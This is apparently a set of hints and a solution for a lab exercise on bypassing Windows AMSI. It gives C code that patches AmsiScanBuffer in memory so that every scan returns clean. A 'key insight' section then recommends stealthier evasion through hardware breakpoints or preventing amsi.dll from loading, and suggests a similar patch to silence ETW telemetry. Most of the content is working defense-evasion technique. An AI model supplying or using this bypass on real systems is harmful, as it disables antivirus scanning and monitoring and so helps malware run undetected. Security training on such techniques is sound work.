=== HINT 1 ===
HMODULE amsi = LoadLibraryA("amsi.dll");
BYTE *fn = (BYTE*)GetProcAddress(amsi, "AmsiScanBuffer");

=== HINT 2 ===
DWORD old = 0;
VirtualProtect(fn, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
memcpy(fn, patch, sizeof(patch));
VirtualProtect(fn, sizeof(patch), old, &old);

=== HINT 3 (SPOILER) ===
print_bytes("after patch:", fn, 8);
// Should show: B8 01 00 00 00 C3 ...

=== KEY INSIGHT ===
The patch bytes: B8 01 00 00 00 C3
  = mov eax, 1    (AMSI_RESULT_CLEAN)
  = ret
AmsiScanBuffer callers check if result == AMSI_RESULT_DETECTED; patched version
always returns CLEAN so the caller skips blocking.
Detection: CRC/hash integrity checks on amsi.dll in memory (Defender, CrowdStrike).
Better evasion: force amsi.dll to not load at all (patch CLR before it loads AMSI),
  or use hardware breakpoints on AmsiScanBuffer to hijack control flow without
  modifying bytes (no memory-write IOC).
ETW bypass: similar patch on EtwEventWrite in ntdll.dll to silence telemetry.
